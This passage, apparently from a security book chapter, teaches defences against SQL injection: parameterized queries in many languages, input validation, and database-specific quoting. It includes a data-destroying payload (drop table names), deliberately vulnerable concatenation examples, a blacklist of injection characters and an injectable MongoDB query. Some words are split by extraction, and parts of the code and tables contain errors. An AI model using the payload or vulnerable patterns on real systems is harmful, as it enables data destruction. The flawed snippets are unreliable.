lookupuser.setstring(“password”, password); // add password list rs = lookupuser.list(); the next example shows the use of hibernate with jdbc -style question mark placeholders for the parameters. note that hibernate indexes parameters from 0, and not 1, as does jdbc. therefore, the first parameter in the list will be 0 and the second will be 1 : string sql = “select ∗ from users where username=? and password=?” ; query lookupuser = session.createquery(sql); // add parameters to sql query lookupuser.setstring(0, username); // add username lookupuser.setstring(1, password); // add password list rs = lookupuser.list(); parameterized statements in .net (c#) microsoft .net provides access to a number of different ways to parameterize statements by using the ado.net framework. ado.net also provides additional functionality, allowing you to further check the parameters supplied, such as by type -checking the data you are passing in. ado.net provides four different data providers, depending on the type of database that is being accessed: system.data.sqlclient for microsoft sql server, system.data.oracleclie nt for oracle databases, and system.data.oledb and system.data.odbc for ole db and odbc data sources, respectively. which provider you use will depend on the database server and drivers being used to access the database. unfortunately, the syntax for utili zing parameterized statements differs among the providers, notably in how the statement and parameters are specified. table 8.1 shows how parameters are specified in each provider. table 8.1 ado.net data providers, an d parameter naming syntax data provider parameter synta x system.data.sqlclient @parameter system.data.oracleclient :parameter (only in parameterized sql command text) system.data.oledb positional parameters with a question mark placeholder ( ?) system.data.odbc positional parameters with a question mark placeholder ( ?) the following example shows the vulnerable example query rewritten as a parameterized statement in .net using the sqlclient provider: sqlconnection con = new sqlconnection(connectionstring); string sql = “select ∗ from users where username=@username ” +“and password=@password” ; cmd = new sqlcommand(sql, con); // add parameters to sql query cmd.parameters.add(“@username”, // namesqldbtype.nvarchar, // data type 16); // length cmd.parameters.add(“@password”,sqldbtype.nvarchar, 16); cmd.parameters.value[“@username”] = username; // set parameters cmd.parameters.value[“@password”] = password; // to supplied values reader = c md.executereader();y the next example shows the same parameterized statement in .net using the oracleclient provider. note that the parameters are preceded by a colon in the command text (the sql string), but not elsewhere in the code: oracleconnection con = new oracleconnection(connectionstring); string sql = “select ∗ from users where username=:username ” +“and password=:password” ; cmd = new oraclecommand(sql, con); // add parameters to sql query cmd.parameters.add(“username”, // nameoracletype.varchar, // data type 16); // length cmd.parameters.add(“password”,oracletype.varchar, 16); cmd.parameters.value[“username”] = username; // set parameters cmd.parameters.value[“password”] = password; // to supplied values reader = cmd.executereader(); the final example shows the same parameterized statement in .net using the oledbclient provider. when using the oledbclient provider, or the odbc provider, you must add parameters in the correct order for the pl aceholder question marks: oledbconnection con = new oledbconnection(connectionstring); string sql = “select ∗ from users where username=? and password=?” ; cmd = new oledbcommand(sql, con); // add parameters to sql query cmd.parameters.add(“@username”, // nameoledbtype.varchar, // data type 16); // length cmd.parameters.add(“@password”,oledbtype.varchar, 16)); cmd.parameters.value[“@username”] = username; // set parameters cmd.parameters.value[“@password”] = password; // to supplied values reader = cmd.execu tereader(); tip when using parameterized statements with ado.net, it is possible to specify less or more detail about the statement than i did in the preceding example. for instance, you can specify just the name and the value in the parameter constructor. in general, it is a good security practice to specify parameters as i did, including the data size and type, because this provides an additional level of coarse- grained validation over the data that is being passed to the database. parameterized statement s in php php also has a number of frameworks that you can use to access a database. i’ll demonstrate three of the most common frameworks in this section: the mysqli package for accessing mysql databases, the pear::mdb2 package (which superseded the popular pear::db package), and the new php data objects (pdos) framework, all of which provide facilities for using parameterized statements. the mysqli package, available with php 5. x and able to access mysql 4.1 and later databases, is one of the most commonly used database interfaces, and supports parameterized statements through the use of placeholder question marks. the following example shows a parameterized statement using the mys qli package: $con = new mysqli(“localhost”, “username”, “password”, “db”); $sql = “select ∗ from users where username=? and password=?” ; $cmd = $con- >prepare($sql); // add parameters to sql query $cmd->bind_param(“ss”, $username, $password); // bind parameters as strings $cmd->execute(); when using php with postgresql a simple to use method for parameterized statements was introduced in php 5.1.0. this method is named pg_query_params() and allows developers to supply the sql query and the parameters on the same line, as in the following example: $result = pg_query_params(“select ∗ from users where username=$1 and password=$2” , array($username, $password)); the pear::mdb2 package is a widely used and vendor -independent framework for accessing databases. mdb2 supports named parameters using the colon character and using placeholder question marks. the following example demonstrates the use of mdb2 with placeholder question marks to build a parameterized stat ement. note that the data and types are passed in as an array which maps to the placeholders in the query: $mdb2 =& mdb2::factory($dsn); $sql = “select ∗ from users where username=? and password=?” ; $types = array(‘text’, ‘text’); // set data types $cmd = $mdb2- >prepare($sql, $types, mdb2_prepare_manip); $data = array($username, $password); // parameters to be passed $result = $cmd ->execute($data); the pdo package, which is included with php 5.1 and later, is an object -oriented vendor independent data layer for accessing databases. pdo supports both named parameters using the colon character and the use of placeholder question marks. the following example demonstrates the use of pdo with named parameters to build a parameterized statement: $sql = “select ∗ from users where username=:username and” +“password=:password”; $stmt = $dbh- >prepare($sql); // bind values and data types $stmt->bindparam(‘:username’, $username, pdo::param_str, 12); $stmt->bindparam(‘:password’, $password, pdo::param_str, 12); $stmt->execute(); parameterized statements in pl/sql oracle pl/sql offers also the possibility of using parameterized queries in database- level code. pl/sql supports binding parameters using the colon character with an index (e.g. :1). the following example demonstr ates the use of pl/sql with bound parameters to build a parameterized statement in an anonymous pl/sql block: declare username varchar2(32); password varchar2(32); result integer; begin execute immediate ‘select count(∗ ) from users where username=:1 and password=:2 ’ into result using username, password; end; parameterized statements in mobile apps a mobile application can either load data from a remote location, store data in a loca l database, or both. when loading data from remote locations, sql -injection protection must be built into the service that provides the data. if the application is using a local database, the protection must be implemented in the application code. both ios and android based devices have indevice database support and provide apis for creating, updating, and querying these databases. parameterized statements in ios applications the apis for developing apps for ios support sqlite through the sqlite library libsqlite3.dylib . one popular framework if working directly with sqlite (rather than through the apple framework core data) is the fmdb framework, with which we can build parameterized insert statements using the executeupdate() method: [db executeupdate:@“insert into artists (name) values (?)”, @“sinead o’connor”]; similarly if we want to query the database, we use the executequery() method: fmresultset ∗rs = [db executequery:@“ select ∗ from songs where artist=?” , @“sinead o’connor”]; parameterized statement s in android applications android devices also contain an api for accessing the sqlite database subsystem. this api supports parameterized statements where the developer can supply query and data separately. for insert statements, we use the sqlitestatement class: statement = db.compilestatement(“insert into artists (name) values (?)”); statement.bind(1, “sinead o’connor”); statement.executeinsert(); when querying the database we use the query() method directly on the sqlitedatabase object. this method take s a long list of arguments, where two of them allow us to build query templates and bind parameters: db.query(“songs”, new string[] { “title” } /∗ columns to return ∗ /, “artist = ?” / ∗ where clause ∗ /, new string[] { “sinead o’connor” } /∗ parameters to bind ∗/, null /∗ group by ∗/, null /∗ having ∗/, null /∗ order by ∗/ ); parameterized statements in html5 browser storage there are two types of storage available in the html5 standard —the web sql database and the web storage specification. the web sql database specification is no longer being actively maintained by w3c. this specification allowed developers to build a client side sql database, usually implemented in the browser using sq lite, which could be created and queried using javascript. this specification included a simple way to do parameterized queries using executesql() : t.executesql(‘select ∗ from songs where artist=? and song=?’ , [artist, songname], function(t, data) { //do something with data }); in the above code t is a transaction in which the sql is executed. we use question marks as placeholders and supply an array of the parameters in the order in which they should be applied into the sql statement. the last argument is a callback function for processing the data returned from the database. the web storage specification provides a simple key/value storage using the methods setitem() , getitem() , and removeitem() . as this specification does not have a query language where queries are built by string concatenation, it is not subject to injection attacks similar to sql injection. validating input input validation is the process of testing input received by the application for compliance against a standard defined within the a pplication. it can be as simple as strictly typing a parameter and as complex as using regular expressions or business logic to validate input. there are two different types of input validation approaches: whitelist validation (sometimes referred to as inc lusion or positive validation) and blacklist validation (sometimes known as exclusion or negative validation). these two approaches, and examples of validating input in java, c#, and php to prevent sql injection, are detailed in the following subsections . tip when performing input validation you should always ensure that the input is in its canonical (simplest) form before making any input validation decisions. this may involve decoding the input into a simpler format, or just rejecting input that isn’t alr eady in canonical format where non -canonical input isn’t expected. we’ll cover canonicalization in a separate solution later in this chapter. whitelisting whitelist validation is the practice of only accepting input that is known to be good. this can invol ve validating compliance with the expected known values, type, length or size, numeric range, or other format standards before accepting the input for further processing. for example, validating that an input value is a credit card number may involve validating that the input value contains only numbers, is between 13 and 16 digits long, and passes the business logic check of correctly passing the luhn formula (the formula for calculating the validity of a number based on the last “check” digit of the card) . when using whitelist validation you should consider the following points: • known value: is the data something where there is a known list of valid values? is the value provided something that can be looked up to determine if it is correct? • data type: is the data type correct? if the value is supposed to be numeric, is it numeric? if it is supposed to be a positive number, is it a negative number instead? • data size: if the data is a string, is it of the correct length? is it less than the expected maximum length? if it is a binary blob, is it less than the maximum expected size? if it is numeric, is it of the correct size or accuracy? (for example, if an integer is expected, is the number that is passed too large to be an integer value?) • data range: if the data is numeric, is it in the expected numeric range for this type of data? • data content: does the data look like the expected type of data? for example, does it satisfy the expected properties of a zip code if it is supposed to be a zip code? does it contain only the expected character set for the data type expected? if a name value is submitt ed, only some punctuation (single quotes and character accents) would normally be expected, and other characters, such as the less than sign (<), would not be expected. a common method of implementing content validation is to use regular expressions. follo wing is a simple example of a regular expression for validating a us zip code contained in a string: ^\\d{5}(-\\d{4})?$ in this case, the regular expression matches both five -digit and five -digit + four -digit zip codes as follows: • ^\\d{5} match exactly five numeric digits at the start of the string. • (–\\d{4})? match the dash character plus exactly four digits either once (present) or not at all (not present). • $ this would appear at the end of the string. if there is additional content at the end of the string, the regular expression will not match. in general, whitelist validation is more powerful of the two input validation approaches. it can, however, be difficult to implement in scenarios where there is complex input, or where the full set of possible i nputs cannot be easily determined. difficult examples may include applications that are localized in languages with large character sets (e.g. unicode character sets such as the various chinese and japanese character sets). it is recommended that you use whitelist validation wherever possible, and then supplement it by using other controls such as output encoding to ensure that information that is then submitted elsewhere (such as to the database) is handled correctly. known value validation a powerful, but often underused, way to validate input is to compare the input to a list of valid values and reject the input if it is not in the list. by comparing the value against a list, we are in full control over all the possible values and code paths the input may take. as mentioned earlier when discussing parameterized statements, there are elements in sql statements that cannot be parameterized —specifically sql identifiers and keywords. if we for instance look at ordering a result set by a column, the name of the column cannot be parameterized (it is a sql identifier). what we could do though, instead of directly adding an unsanitized value from the user, is to make sure the value holds a valid column name. if we wanted to do this when using mysql, we could first run a statement retrieving all column names for the table in question. we could do this using a select statement as explained in chapter 4 , or we could use describe : describe username this would return a list of valid columns including their data types and default values: +----------+ -------------+ ------+-----+--------- +----------------+ | field | type | null | key | default | extra | +----------+ -------------+ ------+-----+--------- +----------------+ | id | int(11) | no | pri | null | auto_increment | | username | varchar(50) | yes | | null | | | password | varchar(50) | yes | | null | | +----------+ -------------+ ------+-----+--------- +----------------+ we now have a list of all possible column names, and we are able to validate the value. in order to avoid making two queries every time, we can cache the result in the application. if we are building statements on the database, we can also use this concept there. consider the following oracle example: sqlstmt:= ‘select ∗ from foo where var like ’‘% ’ || searchparam || ‘ %’’; sqlstmt:= sqlstmt || ‘ order by ’ || orderby || ‘ ’ || sortorder; ... open c_data for sqlstmt; this is clearly not protected against sql injection, as the searchparam , orderby and sortorder parameters could all be used to change the query. in the case of the searchparam parameter, we can parameterize this as discussed earlier in the chapter, however orderby is a sql identifier, and sortorder is a sql keyword. to avoid this problem w e can use functions on the database side that check if the supplied value is valid. the example functions below demonstrate different types of known value validation. in the first example we validate the sortorder parameter against the list of possible val ues using the oracle decode() command: function get_sort_order(in_sort_order varchar2) return varchar2 is v_sort_order varchar2(10):= ‘asc’; begin if in_sort_order is not null then select decode(upper(in_sort_order),‘asc’,‘asc,’desc’,‘desc’,‘asc’ into v_sort_order from dual; end if; return v_sort_order; end; in the second example, we validate the supplied column name ( orderby ) by performing a lookup on columns in the table, and validating that the column name supplied is present in the table: function get_order_by(in_table_name varchar2, in_column_name varchar2, in_default_column_name varchar2) return varchar2 is v_count number; begin select count(∗ ) into v_count from all_tab_columns where lower(column_name)=lower(in_column_name) and lower(table_name)=lower(in_table_name); if v_count=0 then return in_default_column_name; else return in_column_name; end if; exception when others then return in_default_name; end; a subtype of known value validation is input indirection. instead of accepting values directly from the client, the client is presented with a list of allowed values and submits the index of the selected value. for example—in a banking application the user could be presented with a list of valid account numbers, but when submitting back the account number the browser would submit the index of the account number in the list. on the server side this index would then be looked up in the list and the real account number would be used to create the query. when building sql statements we can thus trust the account number, as only valid values were available in the list. be careful when taking this approach though —if the index is manipulated this may have unanticipated effects on business logic and functionality . tools & traps... designing an input validation and handling strategy input validation is a valuable tool for securing an application. however, it should be only part of a defense -indepth strategy, with multiple layers of defense contributing to the application’s overall security. here is an example of an input validation a nd handling strategy utilizing some of the solutions presented in this chapter: • whitelist input validation used at the application input layer to validate all user input as it is accepted by the application. the application allows only input that is in t he expected form. • whitelist input validation also performed at the client’s browser. this is done to avoid a round trip to the server in case the user enters data that is unacceptable. you cannot rely on this as a security control, as all data from the u ser’s browser can be altered by an attacker. • blacklist and whitelist input validation present at a web application firewall (waf) layer (in the form of vulnerability “signatures” and “learned” behavior) to provide intrusion detection/prevention capabilities and monitoring of application attacks. • parameterized statements used throughout the application to ensure that safe sql execution is performed. • encoding used within the database to safely encode input when used in dynamic sql. • data extracted from the database appropriately encoded before it is used. for example, data being displayed in the browser is encoded for cross -site scripting (xss). blacklisting blacklisting is the practice of only rejecting input that is known to be bad. this commonly involves rejecting input that contains content that is specifically known to be malicious by looking through the content for a number of “known bad” characters, strings, or patterns. this approach is generally weaker than whitelist validation because the list of potentially bad characters is extremely large, and as such any list of bad content is likely to be large, slow to run through, incomplete, and difficult to keep up to date. a common method of implementing a blacklist is also to use regular expressions, with a list of characters or strings to disallow, such as the following example: ‘|%|--|;|/\\∗|\\\\\\∗|_|\\[|@|xp_ in general, you should not use blacklisting in isolation, and you should use whitelisting if possible. however, in scenarios where you cannot use whitelisting, blacklisting can still provide a useful partial control. in these scenarios, however, it is recommended that you use blacklisting in conjunction with output encoding to ensure that input passed elsewhere (e.g. to the database) is subject to an additional check to ensure that it is correctly handled to prevent sql injection . damage & defense... what to do when input fails validation? so, what do you do when input fails validation? there are two major approaches: recovering and continuing on, or failing the action and reporting an error. each has its advantages and disadvantages: • recovering: recovering from an input validation failure implies that the input can be sanitized or fixed —that is, that the problem that caused the failure can be solved programmatically. this is generally more likely to be possible if you are taking a blacklisting approach for input validation, and it commonly takes the approach of removing bad characters fro m the input. the major disadvantage of this approach is ensuring that the filtering or removal of values does actually sanitize the input, and doesn’t just mask the malicious input, which can still lead to sql injection issues. • failing: failing the actio n entails generating a security error, and possibly redirecting to a generic error page indicating to the user that the application had a problem and cannot continue. this is generally the safer option, but you should still be careful to make sure that no information regarding the specific error is presented to the user, as this could be useful to an attacker to determine what is being validated for in the input. the major disadvantage of this approach is that the user experience is interrupted and any tran saction in progress may be lost. you can mitigate this by additionally performing input validation at the client’s browser, to ensure that genuine users should not submit invalid data, but you cannot rely on this as a control because a malicious user can change what is ultimately submitted to the site. whichever approach you choose, ensure that you log that an input validation error has occurred in your application logs. this could be a valuable resource for you to use to investigate an actual or attempted break -in to your application. validating input in java in java, input validation support is specific to the framework being used. to demonstrate input validation in java, we will look at how a common framework for building web applications in java, java server faces (jsfs), provides support for input validation. for this purpose, the best way to implement input validation is to define an input validation class that implements the javax.faces.validator.validator interface. refer for the following code snippe t for an example of validating a username in jsf: public class usernamevalidator implements validator {public void validate(facescontext facescontext, uicomponent uicomponent, object value) throws validatorexception { //get supplied username and cast to a string string username = (string)value; //set up regular expression pattern p = pattern.compile(“^[a- za-z]{8,12}$”); //match username matcher m = p.matcher(username); if (!matchfound) {facesmessage message = new facesmessage(); message.setdetail(“not valid – it must be 8– 12 letter only”); message.setsummary(“username not valid”); message.setseverity(facesmessage.severity_error); throw new validatorexception(message); } } and the following will need to be added to the faces -config.xml file in order to enable the above validator: <validator> <validator -id>namespace.usernamevalidator</validator- id> <validator -class>namespace.package.usernamevalidator</validator- class> </validator> you can then refer to this in the related jsp file as follows: <h:inputtext value=“username” id=“username” required=“true”><f:validator validatorid=“namespace.usernamevalidator” /> </h:inputtext> an additional useful resource for implementing input validation in java is the owasp enterprise security api (esapi) that y ou can download at www.owasp.org/index.php/esapi . esapi is a freely available reference implementation of security -related methods that you can use to build a secure application. this includes an impleme ntation of an input validation class, org.owasp.esapi.reference.defaultvalidator , which you can use directly or as a reference implementation for a custom input validation engine. validating input in .net asp.net features a number of built -in controls that you can use for input validation, the most useful of which are the regularexpressionvalidator control and the customvalidator control. using these controls with an asp.net application provides the additional benefit that client side validation will also be performed, which will improve the user experience in case the user genuinely enters erroneous input. the following code is an example of the use of regularexpressionvalidator to validate that a username contains only letters (uppercase and lowercase) and is between 8 and 12 characters long: <asp:textbox id=“username” runat=“server”/> <asp:regularexpressionvalidator id=“usernameregex” runat=“server”controltovalidate=“username” errormessage=“username must contain 8– 12 letters only.” validationexpression=“^[a- za-z]{8,12}$” /> the next code snippet is an example of the use of customvalidator to validate that a password is correctly f ormatted. in this case, you also need to create two user -defined functions: pwdvalidate on the server to perform validation on the password value, and clientpwdvalidate in client -side javascript or vbscript to validate the password value at the user’s brow ser: <asp:textbox id=“txtpassword” runat=“server”/> <asp:customvalidator runat=“server”controltovalidate=“txtpassword” clientvalidationfunction=“clientpwdvalidate” errormessage=“password does not meet requirements.” onservervalidate=“pwdvalidate” /> valida ting input in php as php is not directly tied to a presentation layer, input validation support in php, as in java, is specific to the framework in use. because there is no presentation framework in php with overwhelming popularity, a large number of php a pplications implement input validation directly in their own code. you can use a number of functions in php as the basic building blocks for building input validation, including the following: • preg_match(regex, matchstring): do a regular expression match with matchstring using the regular expression regex . • is_<type>(input): check whether the input is <type> ; for example, is_numeric() . • strlen(input): check the length of the input. an example of using preg_match to validate a form parameter could be as follows: $username = $_post[‘username’]; if (!preg_match(“/^[a- za-z]{8,12}$/d”, $username) { // handle failed validation } validating input in mobile applications as mentioned data in mobile applications can either be stored on a remote server or locally in the app. in both cases we want to validate the input locally, however for data stored remotely we also need to do input validation as a part of the remote service, as there is no guarantee that there is an actual mobile application at the other end. it could just as well be an attacker using a custom attack application. the in -device input validation can be done in two ways. we can either use a field type that only supports the data type we expect. this could be a numeric field where only numbers can be entered. we can also subscribe to change events for the input fields, and handle invalid input as we receive it. android supports the concept of input filters, where one or more implementations of inputfilter are aut omatically applied to the data, and can reject invalid input. validating input in html5 as for mobile apps we also have to consider where data is stored when developing html5 applications. data can be stored locally in the web browser storage, or it can be stored remotely on the web server hosting the html5 web application. we can validate data stored in the browser in javascript or by using the new types of input fields available to html5. these input fields support the required -attribute instructing the b rowser to require that the field has a value, and the pattern -attribute, which allows the developer to input a regular expression the input must satisfy: <input type=“text” required=“required” pattern=“^[0- 9]{4}” ... but we have to remember that an attacker is able to manipulate the html, javascript and data stored in the web browser storage within his own browser. thus if the application is sending data back to our server -side application, the server -side code must always revalidate the input it receives fro m the html5 application. encoding output in addition to validating input received by the application, it is often necessary to also encode what is passed between different modules or parts of the application. in the context of sql injection, this is applie d as requirements to encode, or “quote,” content that is sent to the database to ensure that it is not treated inappropriately. however, this is not the only situation in which encoding may be necessary. an often- unconsidered situation is encoding informat ion that comes from the database, especially in cases where the data being consumed may not have been strictly validated or sanitized, or may come from a third -party source. in these cases, although not strictly related to sql injection, it is advisable th at you consider implementing a similar encoding approach to prevent other security issues from being presented, such as xss. encoding to the database even in situations where whitelist input validation is used, sometimes content may not be safe to send to the database, especially if it is to be used in dynamic sql. for example, a last name such as o’boyle is valid, and should be allowed through whitelist input validation. this name, however, could cause significant problems in situations where this input is used to dynamically generate a sql query, such as the following: string sql = “insert into names values (‘“ + fname + ”‘,‘“ + lname + ”’);” additionally, malicious input into the first name field, such as: ’,’’); drop table names -- be used to alter the sq l executed to the following: insert into names values (’’,’’); drop table names--’,’’); you can prevent this situation through the use of parameterized statements, as covered earlier in this chapter. however, where it is not possible or desirable to use these, it will be necessary to encode (or quote) the data sent to the database. this approach has a limitation, in that it is necessary to encode values every time they are used in a database query; if one encode is missed, the application may well be vulnerable to sql injection. encoding for oracle as oracle uses the single -quote character as the terminator for a string literal, it is necessary to encode the single quote when it is included in strings that will be included within dynamic sql. in oracle, you can do this by replacing the single quote with two single quotes. this will cause the si ngle quote to be treated as a part of the string literal, and not as a string terminator, effectively preventing a malicious user from being able to exploit sql injection on that particular query. you can do this in java via code that is similar to the fol lowing: sql = sql.replace(“’”, “’’”); for example, the preceding code would cause the string o’boyle to be quoted to the string o’’boyle . if stored to the database, it will be stored as o’boyle but will not cause string termination issues while being manipulated while quoted. you should be careful when doing a string replacement in pl/sql code, however. because the single quote needs to be quoted in pl/sql since it is a string terminator, you nee d to replace a single quote with two single quotes in pl/sql via the slightly less straightforward replacement of one quote (presented by two single quotes) with two quotes (represented by four quotes) as follows: sql = replace(sql, ’’’’, ’’’’’’); which ma y be more logical and clearer to represent as character codes: sql = replace(sql, chr(39), chr(39) || chr(39)); for other types of sql functionality, it may also be necessary to quote information that is submitted in dynamic sql, namely where using wildcar ds in a like clause. depending on the application logic in place, it may be possible for an attacker to modify how the application logic works by utilizing wildcards in user input that is later used in a like clause. in oracle, the wildcards in table 8.2 are valid in a like clause. table 8.2 oracle like wildcards character meanin g % match zero or more of any characters _ match exactly one of any character in instances where user input includes one of the characters in table 8.2, you can ensure that they are treated correctly by defining an escape character for the query, preceding the wildcard character with the escape character, and specifying the escape character in the query using an escape clause. here is an example: select ∗ from users where name like ‘ a%’ --vulnerable. returns all users starting with ‘a’ select ∗ from users where name like ‘ a\\%’ escape ‘\\’ --not vulnerable. returns user ‘a%’, if one exists note that when using the escape clause, you can specify any single character to be used as the escape character. i used the backslash in the preceding example because this is a common convention when escaping content. additionally, on oracle 10g release 1 and later, there is one more method of quoting a string —the “ q” quote, which takes the form q‘[quote char]string[quote char]’ . the quote character can be any single character that doesn’t occur in the string, wit h the exception that oracle expects matching brackets (i.e. if you’re using “ [“ as the opening quote character, it expects the matching ” ]” as the closing quote character). the following are some examples of quoting strings in this way: q’(5%)’ q’ao’boylea’ oracle dbms_assert with oracle 10g release 2, oracle introduced a new package called dbms_assert. this package was then back -ported to older database versions (until oracle 8i). you should use dbms_assert to perform input validation if paramet erized queries (e.g. in from clauses) are not possible. dbms_assert offers seven different functions ( enquote_literal , enquote_name , noop, qualified_sql_name , schema_name , simple_sql_name , and sql_object_name ) to validate different types of input. warning you should not use the noop function, because the function does nothing and does not protect you from sql injection. oracle uses this function internally to avoid false positives during automatic source code scanning. you can use the preceding functions as shown in the following examples. the first code snippet is an insecure query without dbms_assert (sql injection in field , owner , and table ): execute immediate ‘select ’|| field ||‘from’|| owner ||‘.’|| table; here is the same query, with input validation using dbms_assert: execute immediate ‘select ’||sys.dbms_assert.simple_sql_name(field) ||‘from’||sys.dbms_assert.enquote_name (sys.dbms_assert.schema_name(owner),false) ||‘.’||sys.dbms_assert.qualified_sql_name(table); table 8.3 lists the various functions supported by dbms_assert. table 8.3 dbms_assert functions function descriptio n dbms_assert.schema_name this function checks to see whether the passed string is an existing object in the database function descriptio n dbms_assert.simple_sql_name this function checks that characters in an sql element consist only of a–z, a–z, 0–9, $, #, and _. if the parameter is quoted with double quotes, everything with the exception of double quotes is allowed dbms_assert.sql_object_name this function checks to see whether the passed string is an existing object in the database dbms_assert.simple_sql_name this function checks that characters in an sql element consist only of a–z, a–z, 0–9, $, #, and _. if the parameter is quoted with double quotes, everything with the exception of double quotes is allowed dbms_assert.qualified_sql_name this function is very similar to the simple_sql_name function but also allows database links dbms_assert.enquote_literal this function quotes the passed argument in double quotes. if the argument was already quoted, nothing will be done dbms_assert.enquote_name this function encloses the user -supplied string in single quotes if it has not already been done oracle offers a detailed explanation on how to use dbms_assert in a tutorial on defending against sql injection attacks ( http://stcurriculum.oracle.com/tutorial/sqlinjection/index.htm ). to avoid attacks via modified public synonyms you should always call the package via its fully qualified name. encoding for microsoft sql server as sql server also uses the single quote as the terminator for a string literal, it is necessary to encode the single quote when it is included in strings that will be included within dynamic sql. in sql server, you can achieve this by replacing the single quote with two single quotes. this will cause the single quote to be treated as a part of the string literal, and not as a string terminator, effectively preventing a malicious user from being able to exploit sql injection on that particular query. you can do this in c# via code that is similar to the following: sql = sql.replace(“’”, “’’”); for example, the preceding code would cause the string o’boyle to be quoted to the string o’’boyle . if stored to the database, it will be stored as o’boyle but will not cause string termination issues while being manipulated while quoted. you should be careful when doing a string replacement in stored procedure transact -sql code, however. because the single quote needs to be quoted in transact -sql since it is a string terminator, you need to replace a single quote with two single quotes in transact -sql via the slightl y less straightforward replacement of one quote (presented by two single quotes) with two quotes (represented by four quotes) as follows: set @enc = replace(@input, ’’’’, ’’’’’’) which may be more logical and clearer to represent as character codes: set @enc = replace(@input, char(39), char(39) + char(39)); for other types of sql functionality, it may also be necessary to quote information that is submitted in dynamic sql, namely where using wildcards in a like clause. depending on the application logic in place, it may be possible for an attacker to subvert logic by supplying wildcards in the input that is later used in the like clause. in sql server, the wildcards that are shown in table 8.4 are valid in a like clause. table 8.4 microsoft sql server like wildcards character meanin g % match zero or more of any character _ match exactly one of any character character meanin g [ ] any single character within the specified range [a–d] or set [abcd] [^] any single character not within the specified range [^a–d] or set [^abcd] in instances where you need to use one of these characters in a like clause within dynamic sql, you can quote the character with square brackets, []. note that only the percentage ( %), underscore ( _) and opening square bracket ( [) characters will need to be quoted; the closing square bracket ( ]), carat ( ^), and dash ( -) characters have special meaning only when they are preceded by an opening square bracket. you can do this as follows : sql = sql.replace(“[”, “[[]”); sql = sql.replace(“%”, “[%]”); sql = sql.replace(“_”, “[_]”); additionally, to prevent a match on one of the preceding characters, you can also define an escape character for the query, precede the wildcard character with t he escape character, and specify the escape character in the query using an escape clause. here is an example: select ∗ from users where name like ‘ a%’ -- vulnerable. returns all users starting with ‘a’ select ∗ from users where name like ‘ a\\%’ escape ‘\\’ -- not vulnerable. returns user ‘a%’, if one exists note that when using the escape clause, you can specify any single character to be used as the escape character. i used the backslash in this example because this is a common convention when escaping cont ent. tip when encoding single quotes as two single quotes in transact -sql (e.g. in a stored procedure), be careful to allocate enough storage to the destination string; generally twice the expected maximum size of the input plus one should be sufficient. t his is because microsoft sql server will truncate the value that is stored if it is too long, and this can lead to problems in dynamic sql at the database level. depending on the query logic in place, this can lead to an sql injection vulnerability that is caused by the filtering you have in place to prevent it. for the same reason, it is recommended that you use replace() rather than quotename() to perform encoding, as quotename() does not correctly handle strings longer than 128 characters. encoding for mysql mysql server also uses the single quote as a terminator for a string literal, so it is necessary to encode the single quote when it is included in strings that will be included within dynamic sql. in mysql, you can do this either by repl acing the single quote with two single quotes as with other database systems, or by quoting the single quote with a backslash ( \\). either of these will cause the single quote to be treated as a part of the string literal, and not as a string terminator, ef fectively preventing a malicious user from being able to exploit sql injection on that particular query. you can do this in java via code that is similar to the following: sql = sql.replace(“’”, “ \\’”); additionally, php provides the mysql_real_escape() function, which will automatically quote the single quote with a backslash, as well as quoting other potentially harmful characters such as 0x00 ( null), newline ( \\n), carriage return ( \\r), double quotes ( “), backslash ( \\), and 0x1a (ctrl+z ): mysql_real_escape_string($user); for example, the preceding code would cause the string o’boyle to be quoted to the string o\\’boyle. if stored to the database, it will be stored as o’boyle but will not cause string termination issues while being manipulated while quoted. y ou should be careful when doing a string replacement in stored procedure code, however. because the single quote needs to be quoted since it is a string terminator, you need to replace a single quote with two single quotes in stored procedure code via the slightly less straightforward replacement of one quote (presented by a quoted single quote) with a quoted single quote (represented by a quoted backslash and a quoted single quote) as follows: set @sql = replace(@sql, ‘\\ ’’, ‘\\\\\\’’) which may be more logica l and clearer to represent as character codes: set @enc = replace(@input, char(39), char(92, 39)); for other types of sql functionality, it may also be necessary to quote information that is submitted in dynamic sql, namely where using wildcards in a like clause. depending on the application logic in place, it may be possible for an attacker to subvert logic by supplying wildcards in the input that is later used in the like clause. in mysql, the wildcards in table 8.5 are valid in a like clause. table 8.5 mysql like wildcards character meanin g % match zero or more of any characters _ match exactly one of any character to prevent a match on one of the characters shown in table 8.5, you can escape the wildcard character with the backslash character ( \\). here’s how to do this in java: sql = sql.replace(“%”, “ \\%”); sql = sql.replace(“_”, “ \\_”); encoding for postgresql postgresql also uses a single quote as a terminator fo r a string literal. the single quote can be encoded in two ways. you can either replace a single quote with two single quotes, like for oracle or microsoft sql server. in php that can be achieved by: $encodedvalue = str_replace(“’”, “’’”, $value); an alter native approach is to encode the single quote using a backslash, but postgresql will then also expect you to put an upper case e in front of the string literal like this: select ∗ from user where lastname=e’ o\\’boyle’ in php the backslash encoding could be performed using add_slashes() or str_replace() , but these are not the recommended approaches. the best approach for encoding strings for postgresql in php is to use the pq_escape_string() method: $encodedvalue = pg_escape_string($value); this function invokes libpq’s pqescapestring() which replaces a single backslash with a double, and a single quote with two: ‘ → ’’ \\ → \\\\ another way to create string literals in postgresql, is to use the $ character. this character allows the developer to use a tag -like f unctionality within the sql statements. a string built using this syntax could look like this: select ∗ from user where lastname=$quote$o ’boyle$quote$ in this case we need to make sure to escape any $ character in the user input by using a backslash: $encodedvalue = str_replace(“$”, “ \\\\$”, $value); avoiding nosql injection nosql database systems differ greatly in their implementation and apis. common to many is that most methods in the query apis provide methods that clearly separate data from code. for example, when using mongodb from php data is typically inserted using associative arrays: $users->insert(array(“username”=> $username, “password” => $password)) and query could look something like this: $user = $users ->findone(array(“username” => $username)) both of these examples use a syntax that resembles parameterized statements. when using these apis, we avoid building the queries by string concatenation, thus avoiding injection attacks. however there are apis where we really need to pay attention. for mo re advanced queries, mongodb allows the developer to submit a javascript function using the $where keyword: $collection- >find(array(“\\ $where” => “function() { return this.username.indexof(‘$test’) > 1 }”)); as we see, the javascript function is injectable. an attacker can escape the string within indexof() and alter the way the query works. to avoid this we would have to use javascript encoding. the safest approach would be to escape all non- alphanumeric characters using hexadecimal encoding of type \\xnn or unicode encoding of type \\unnnn. warning take special care when using apis where queries are built by concatenating strings containing data and control. they are most likely injectable in a similar manner as sql injection. this is true for apis using js on, xml, xpath, ldap and other query languages if encoding is not handled properly. whenever you use such an api, identify the contexts and how to encode for each of them. damage & defense... encoding from the database a common issue when using databases is the inherent trust of the data that is contained in the database. data contained within the database commonly is not subjected to rigorous input validation or sanitization before being stored in the database; or, it may have come from 